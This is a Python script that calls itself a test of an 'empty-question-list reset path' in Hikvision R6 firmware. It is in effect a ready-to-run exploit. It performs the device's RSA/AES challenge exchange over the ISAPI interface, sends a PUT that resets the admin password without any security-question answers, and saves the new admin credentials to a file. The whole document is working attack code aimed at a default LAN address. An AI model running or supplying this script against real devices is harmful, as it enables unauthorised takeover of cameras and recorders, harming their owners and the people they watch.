#!/usr/bin/env python3
"""Test the empty-question-list reset path in Hikvision R6 firmware."""

import argparse
import base64
import os
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def send_xml(url: str, body: bytes, method: str = "POST") -> bytes:
    request = urllib.request.Request(
        url,
        data=body,
        method=method,
        headers={"Content-Type": "application/xml"},
    )
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            return response.read()
    except urllib.error.HTTPError as error:
        return error.read()


def encrypt_block(key: bytes, value: bytes) -> bytes:
    block = value[:16].ljust(16, b"\0")
    encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    return encryptor.update(block) + encryptor.finalize()


def get_challenge(base_url: str) -> bytes:
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=1024)
    modulus = format(private_key.public_key().public_numbers().n, "x").encode()
    key_text = base64.b64encode(modulus).decode()
    request = f"<PublicKey><key>{key_text}</key></PublicKey>".encode()
    response = ET.fromstring(send_xml(f"{base_url}/ISAPI/Security/challenge", request))
    ciphertext_text = base64.b64decode(response.findtext("{*}key") or "").rstrip(b"?")
    challenge = private_key.decrypt(bytes.fromhex(ciphertext_text.decode()), padding.PKCS1v15())
    if len(challenge) != 32 or any(c not in b"0123456789abcdef" for c in challenge):
        raise ValueError(f"unexpected challenge: {challenge!r}")
    return challenge


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://192.168.20.207")
    parser.add_argument("--password", required=True)
    parser.add_argument("--credentials", type=Path)
    args = parser.parse_args()

    password = args.password.encode()
    if not 1 <= len(password) <= 16:
        raise ValueError("password must be 1-16 bytes")

    challenge = get_challenge(args.url.rstrip("/"))
    aes_key = bytes.fromhex(challenge.decode())
    ciphertext = encrypt_block(aes_key, challenge[:16]) + encrypt_block(aes_key, password)
    reset_password = base64.b64encode(ciphertext.hex().encode()).decode()
    body = (
        "<SecurityQuestion><Resetpassword>"
        f"{reset_password}"
        "</Resetpassword></SecurityQuestion>"
    ).encode()
    response = send_xml(
        f"{args.url.rstrip('/')}/ISAPI/Security/questionCertification",
        body,
        method="PUT",
    )
    print(response.decode(errors="replace"))
    root = ET.fromstring(response)
    success = root.findtext("{*}statusCode") == "1"
    if success and args.credentials:
        args.credentials.parent.mkdir(parents=True, exist_ok=True)
        args.credentials.write_text(f"username=admin\npassword={args.password}\n")
        os.chmod(args.credentials, 0o600)
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
